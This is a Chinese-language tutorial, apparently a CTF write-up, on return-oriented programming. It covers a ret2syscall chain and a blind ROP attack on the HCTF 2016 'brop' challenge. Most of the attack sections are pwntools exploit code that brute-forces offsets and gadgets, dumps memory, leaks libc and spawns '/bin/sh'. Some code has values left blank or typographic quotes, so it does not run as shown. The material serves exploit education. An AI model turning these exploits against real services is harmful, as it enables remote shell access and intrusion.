## **返回导向编程ROP**

 **返回导向编程** （英语：Return-Oriented Programming，缩写：ROP）是计算机安全中的一种 **漏洞利用技术**
，该技术允许攻击者在程序启用了安全保护技术（如堆栈不可执行）的情况下控制程序执行流，执行恶意代码。其核心思想是通过栈溢出等方式控制堆栈调用，以劫持程序控制流并执行针对性的机器语言指令序列（称为
**Gadgets** ）。

所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。

**栈帧变化**![](https://image.3001.net/images/20211012/1634022684_6165351cc154735a1168a.png!small)

 **普通ROP：**

 **方法1：**

F5反汇编

![](https://image.3001.net/images/20211012/1634022718_6165353e5a6a3a69b26f6.png!small)

checksec 查看信息

![](https://image.3001.net/images/20211012/1634022732_6165354cdd24142789b49.png!small)

计算padding

![](https://image.3001.net/images/20211012/1634022968_616536389adb1afd94c07.png!small)

查找gadgets

    
    
    ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'eax'
    ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'ebx'
    ROPgadget --binary ret2syscall --only 'int'
    ROPgadget --binary ret2syscall --string '/bin/sh'
    

![](https://image.3001.net/images/20211012/1634023057_6165369108a0c5c5b6e15.png!small)![](https://image.3001.net/images/20211012/1634023069_6165369d5d991e13286c4.png!small)

    
    
    from pwn import *
    p = process('./ret2syscall')
    pop_edx = 0x0806eb90
    binbash = 0x080be408
    pop_eax = 0x080bb196
    int_0x80 = 0x08049421
    payload = flat(['A' * 112, pop_edx, 0, 0, binbash, pop_eax, 0xb, int_0x80])
    p.sendline(payload)
    p.interactive()
    

![](https://image.3001.net/images/20211012/1634023116_616536cc530e83b15e834.png!small)

**方法2：**

    
    
    ROPgadget --binary ret2syscall --ropchain  

![](https://image.3001.net/images/20211012/1634023153_616536f116eb276cfb5fd.png!small)

![](https://image.3001.net/images/20211012/1634023268_616537641fc337879903f.png!small)

    
    
    from struct import pack
    # Padding goes here
    p = b''
    p += pack(b'<I', 0x0806eb6a) # pop edx ; ret
    p += pack(b'<I', 0x080ea060) # @ .data
    p += pack(b'<I', 0x080bb196) # pop eax ; ret
    p += b'/bin'
    p += pack(b'<I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
    p += pack(b'<I', 0x0806eb6a) # pop edx ; ret
    p += pack(b'<I', 0x080ea064) # @ .data + 4
    p += pack(b'<I', 0x080bb196) # pop eax ; ret
    p += b'//sh'
    p += pack(b'<I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
    p += pack(b'<I', 0x0806eb6a) # pop edx ; ret
    p += pack(b'<I', 0x080ea068) # @ .data + 8
    p += pack(b'<I', 0x08054590) # xor eax, eax ; ret
    p += pack(b'<I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
    p += pack(b'<I', 0x080481c9) # pop ebx ; ret
    p += pack(b'<I', 0x080ea060) # @ .data
    p += pack(b'<I', 0x0806eb91) # pop ecx ; pop ebx ; ret
    p += pack(b'<I', 0x080ea068) # @ .data + 8
    p += pack(b'<I', 0x080ea060) # padding without overwrite ebx
    p += pack(b'<I', 0x0806eb6a) # pop edx ; ret
    p += pack(b'<I', 0x080ea068) # @ .data + 8
    p += pack(b'<I', 0x08054590) # xor eax, eax ; ret
    p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
    p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
    p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
    p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
    p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
    p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
    p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
    p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
    p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
    p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
    p += pack(b'<I', 0x0807b5bf) # inc eax ; ret
    p += pack(b'<I', 0x08049421) # int 0x80
    from pwn import *
    # context.log_level="debug"
    sh = process('./ret2syscall')
    # print(p)
    sh.sendline(b’b’*112 + p)
    sh.interactive()
    

![](https://image.3001.net/images/20211012/1634023325_6165379d660e3d93be4e5.png!small)

![](https://image.3001.net/images/20211012/1634023340_616537ac1d7c34b591907.png!small)

**BROP**

 **利用条件**

存在稳定触发的栈溢出漏洞。

进程崩溃后，会立即重启，且重启后的内存不会重新随机化。这样及时开启了ASLR也可以利用。

如果开启了PIE，则服务器必须是fork服务器，且不能使用execve。

 **利用阶段**

Stack Reading :
泄露返回地址和canaries。根据返回地址确定加载地址。一个字节一个字节爆破8字节canaries，每个字节有256中可能性。

BROP：远程搜索gadgets，目标是将目标程序从内存写到socket，传回攻击者本地。

通过syscall、call调用类似write、put等函数。

Build EXP:利用gadgets构造的ROP，从内存中拿出来。就可以进行普通ROP攻击了。

 **例二：HCTF 2016 brop**

    
    
    #include <stdio.h>
    #include <unistd.h>
    #include <string.h>
    int i;
    int check();
    int main(void) {
        setbuf(stdin, NULL);
        setbuf(stdout, NULL);
        setbuf(stderr, NULL);
        puts("WelCome my friend,Do you know password?");
            if(!check()) {
                puts("Do not dump my memory");
            } else {
                puts("No password, no game");
            }
    }
    int check() {
        char buf[50];
        read(STDIN_FILENO, buf, 1024);
        return strcmp(buf, "aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk");
    }
    

出题人GitHub连接<https://github.com/zh-explorer/hctf2016-brop>

1、爆破溢出长度。每次增加一个字符，如果正常返回说明没有溢出。如果刚好错误，说明已经溢出了。返回溢出值 - 1

    
    
    def get_buffer_size():
        for i in range(100):
            payload = "A"
            payload += "A" * i
            buf_size = len(payload) - 1
            try:
                p = remote('192.168.190.129', 10001)
                p.recvuntil("password?\n")
                p.send(payload)
                p.recv()
                p.close()
                log.info("bad: %d" % buf_size)
            except EOFError as e:
                p.close()
                log.info("buffer size: %d" % buf_size)
                return buf_size
    

2、找到一个stop_gadget。这个目的是找到一个类似sleep的函数，程序执行到此会挂在这里。

![](https://image.3001.net/images/20211012/1634023414_616537f657772e3fcca74.png!small)

    
    
    def get_stop_addr(buf_size):
        addr = 0x400000
        while 1:
            addr += 1
            payload = b’b’ * buf_size
            payload += p64(addr)
    
            try:
                p = get_io()
                p.sendline(payload)
                p.recv(timeout=1)
                p.close()
                log.info("stop addr:0x%x" % addr)
                return addr
            except EOFError as e:
                # p.close()
                log.info("stop bad 0x%x" % addr)
            except:
                p.close()
                addr -= 1
    

3、找到一个通用的gadget。目的是操作rdi，通过寄存器rdi进行传值。

![](https://image.3001.net/images/20211012/1634023458_61653822ae613335388b5.png!small)

而5f c3就是pop rdi;ret，所以pop_rdi = gadget_addr + 9

![](https://image.3001.net/images/20211012/1634023470_6165382e7bd2aa83b2c37.png!small)

    
    
    def get_gadgets_addr(buf_size, stop_addr):
        addr = stop_addr
        while 1:
            # sleep(0.1)
            addr += 1
            payload = b’b’ * buf_size
            payload += p64(addr)
            payload += p64(1)
            payload += p64(2)
            payload += p64(3)
            payload += p64(4)
            payload += p64(5)
            payload += p64(6)
            try:
                io = get_io()
                io.sendline(payload + p64(stop_addr))
                io.recv(timeout=1)
                io.close()
                log.info("find address: 0x%x" % addr)
                try:
                    io = get_io()
                    io.sendline(payload)
                    io.recv(timeout=1)
                    io.close()
                    log.info("bad address 0x%x" % addr)
                except:
                    io.close()
                    log.info("gadget address:0x%x" % addr)
                    return addr
            except EOFError as e:
                io.close()
                log.info("bad: 0x%x" % addr)
            except:
                log.info("can't connect")
                addr -= 1
    

此时堆栈情况

![](https://image.3001.net/images/20211012/1634023508_616538548ab915858a0fb.png!small)

4、找到程序中的puts、write函数。目的是通过这个函数打印程序内存数据、函数地址等。

利用Windows可执行文件 45 5a linux \7fELF方式进行判断是否是真正的put地址。

    
    
    def get_puts_call_addr(buf_size, stop_addr, gadget_addr):
        addr = stop_addr
        pop_rdi = gadget_addr + 9
        # addr = 0x401190
        while 1:
            sleep(0.1)
            addr += 1
            payload = b’b’ * buf_size
            payload += p64(pop_rdi)
            payload += p64(0x400000)
            payload += p64(addr)
            payload += p64(stop_addr)
            try:
                io = get_io()
                io.sendline(payload)
                # print(str(io.recv()))
                elf = io.recv()
                if elf.startswith(b"\x7fELF"):
                    print(elf)
                    log.info("puts call address: 0x%x" % addr)
                    io.close()
                    return addr
                log.info("puts bad 0x%x" % addr)
                io.close()
            except EOFError as e:
                io.close()
                log.info("puts bad 0x%x" % addr)
            except:
                log.info("can't connect")
                addr -= 1
    

此时堆栈分析

pdi = 0x400000 == puts(0x400000)

![](https://image.3001.net/images/20211012/1634023607_616538b7abe1922e85c1e.png!small)

5、dump程序内存，和第四步一样，只是这里确定了函数地址，变化参数值而已。目的是打印函数内存，找到put_got的值

    
    
    def dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr):
        pop_rdi = gadgets_addr + 9  # pop rdi; ret
        result = b""
        while start_addr < end_addr:
            # print result.encode('hex')
            # sleep(0.1)
            payload = b"A" * buf_size
            payload += p64(pop_rdi)
            payload += p64(start_addr)
            payload += p64(puts_plt)
            payload += p64(stop_addr)
            try:
                p = get_io()
                p.sendline(payload)
                data = p.recv(timeout=0.1)  # timeout makes sure to recive all bytes
                if data == "\n":
                    data = "\x00"
                elif data[-1] == "\n":
                    data = data[:-1]
                # log.info("leaking: 0x%x --> %s" % (start_addr, (data or '').encode('hex')))
                result += data
                start_addr += len(data)
                p.close()
                print("%d" % (end_addr - start_addr))
            except:
                # pass
                log.info("Can't connect")
        return result
    

  6. 分析dump的内存

![](https://image.3001.net/images/20211012/1634023648_616538e0900f8676daa31.png!small)

![](https://image.3001.net/images/20211012/1634023664_616538f06fe613426a28e.png!small)

6、根据got地址找到函数地址

    
    
    def get_puts_addr(buf_size, gadget_addr, puts_got, puts_call_addr, stop_addr):
        payload = b"A" * buf_size
        payload += p64(gadget_addr + 9)
        payload += p64(puts_got)
        payload += p64(puts_call_addr)
        payload += p64(stop_addr)
        data = b''
        p = get_io()
        p.sendline(payload)
        data = p.recvline()
        data = u64(data[:-1] + b'\x00\x00')
        log.info("puts address: 0x%x" % data)
        p.close()
        return data
    

puts(puts_got)

![](https://image.3001.net/images/20211012/1634023739_6165393bbda9e6530d7d3.png!small)

7、利用ret2libc中学习的基地址绑定关系，得到system和/bin/sh地址

    
    
    def leak(buf_size, gadget_addr, puts_got, puts_call_addr, stop_addr):
        global system_addr, binsh_addr
        puts_addr = get_puts_addr(buf_size, gadget_addr, puts_got, puts_call_addr, stop_addr)
        # 利用libcsearch
        # libcSearch = LibcSearcher('puts', puts_addr)
        # libc_base = puts_addr - libcSearch.dump('puts')
        #
        # system_addr = libc_base + libcSearch.dump('system')
        # binsh_addr = libc_base + libcSearch.dump('str_bin_sh')
        #
        # log.info("system 0x%x" % system_addr)
        # log.info("system 0x%x" % binsh_addr)
        #
        # 利用libc.so
        libc = ELF('./ubuntu_libc.so.6')
        libc_base = puts_addr - libc.sym['puts']
        system_addr = libc_base + libc.sym['system']
        # binsh_addr = puts_addr - libc.sym['puts'] + 0x186C6C
        print(hex(libc.sym['system']))
        binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
        log.info("system 0x%x" % system_addr)
        log.info("binsh 0x%x" % binsh_addr)
    

8、执行system

    
    
    def pwn(buf_size, gadget_addr, puts_got, puts_call_addr, stop_addr):
        payload = b’b’ * buf_size
        payload += p64(gadget_addr + 9)
        payload += p64(binsh_addr)
        payload += p64(system_addr)
        io = get_io()
        io.sendline(payload)
        io.interactive()
    

rdi = /bin/sh

system("/bin/sh")![](https://image.3001.net/images/20211012/1634023833_6165399943dd467982dc0.png!small)

9、执行

    
    
    if __name__ == "__main__":
        # buf_size = get_buffer_size()
        buf_size = 
        # stop_addr = get_stop_addr(buf_size)
        stop_addr = 
        # gadget_addr = get_gadgets_addr(buf_size, stop_addr)
        gadget_addr = 
        # puts_call_addr = get_puts_call_addr(buf_size, stop_addr, gadget_addr)
        # puts_call_addr = 
        puts_call_addr = 
        #
        # data_bin = dump_memory(72,stop_addr,gadget_addr,puts_call_addr,0x400000,0x402000)
        # with open('data.bin','wb') as f:
        #     f.write(data_bin)
        #     f.close()
        # puts_got = 
        puts_got = 
        leak(buf_size, gadget_addr, puts_got, puts_call_addr, stop_addr)
        pwn(buf_size, gadget_addr, puts_got, puts_call_addr, stop_addr)
    

